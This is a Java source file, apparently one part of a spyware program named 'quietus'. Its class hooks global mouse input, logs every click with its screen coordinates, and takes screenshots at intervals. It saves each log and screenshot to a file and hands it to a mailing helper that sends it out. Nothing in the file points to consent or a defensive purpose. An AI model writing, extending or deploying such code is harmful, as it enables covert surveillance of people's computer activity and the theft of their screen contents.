package com.quietus.utils;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseInputListener;
import org.imgscalr.Scalr;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;
import java.util.concurrent.atomic.AtomicInteger;

class mUtil implements NativeMouseInputListener, Runnable {

    private final List<String> mouseList = new ArrayList<>();
    private volatile int writing = 0;
    private final AtomicInteger pressCount = new AtomicInteger(0);

    public void nativeMousePressed(NativeMouseEvent e) {

        while (writing == 1){

            Thread.onSpinWait();

        }

        String mousePressed = "[" + e.getButton() + " DOWN @ (" + e.getX() + ", " + e.getY() + ")] ";

        mouseList.add(mousePressed);

        pressCount.getAndIncrement();

    }

    public void nativeMouseReleased(NativeMouseEvent e) {

        while (writing == 1){

            Thread.onSpinWait();

        }

        String mouseReleased = "[" + e.getButton() + " UP @ (" + e.getX() + ", " + e.getY() + ")] ";

        mouseList.add(mouseReleased);

        ListIterator<String> mouseIterator = mouseList.listIterator();

        if (mouseList.size() > 100 && writing == 0){

            writing = 1;

            String mouseMemory = "";

            while (mouseIterator.hasNext()){

                mouseMemory = mouseMemory + mouseIterator.next();

            }

            try {
                wUtil write = new wUtil();
                String fileName = write.textWrite(mouseMemory);

                pUtil posting = new pUtil();
                posting.mailing(fileName);

            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }

            mouseList.clear();
            writing = 0;

        }

        if (pressCount.get() > 50 && writing == 0) {

            writing = 1;

            try {
                wUtil write = new wUtil();
                String fileName = write.takeAndSaveSS(1280, 720, Scalr.Method.SPEED, false);

                pUtil posting = new pUtil();
                posting.mailing(fileName);
            } catch (Exception ex) {
                throw new RuntimeException(ex);
            }
            pressCount.set(0);
            writing = 0;

        }

    }

    @Override

    public void run(){

        mUtil mlog = new mUtil();
        GlobalScreen.addNativeMouseListener(mlog);

    }

}
